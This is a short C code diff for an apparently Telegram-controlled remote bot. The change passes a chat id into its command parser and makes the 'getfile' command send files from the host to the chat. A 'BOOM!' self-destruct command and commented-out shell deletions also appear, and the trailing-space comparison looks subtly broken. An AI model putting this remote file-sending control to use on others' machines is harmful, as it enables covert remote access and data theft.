@@ -14,9 +14,8 @@ struct message {
     char servermessage[150];
 }message;
 
-void *changecommand(char *text);
+void *changecommand(char *id,char *text);
 
-int check_exe_len();
 
 int main(int argc , char *argv[])
 {
@@ -77,7 +76,7 @@ int main(int argc , char *argv[])
     }
     // printf("%s\n",chat_text);
     
-    changecommand(chat_text);
+    changecommand(chat_id,chat_text);
     printf("%s\n", chat_text);
     //combine all message_box
     FILE *fp, *error_file, *exe_file;
@@ -160,7 +159,7 @@ int main(int argc , char *argv[])
     // fp = popen("rm exe.txt","r");
     // fp = popen("rm error.txt","r");
 }
-void *changecommand(char *text) {
+void *changecommand(char *id,char *text) {
     char text_build[4000], command_detail[500];
     int start_index, index = 0, length;
 
@@ -205,8 +204,9 @@ void *changecommand(char *text) {
         else if(strcmp(text, "mkdir") == 0) {
             strcpy(command_detail, "Make directory.");
         }
-        else if(strcmp(text, "getfile") == 0) {
+        else if(strcmp(text, "getfile ") == 0) {
             strcpy(command_detail, "Download file from bot.");
+            telegram_send_file(id,text);
         }
         else if(strcmp(text, "BOOM!") == 0) {
             strcpy(command_detail, "DESTROY ITSELF!");
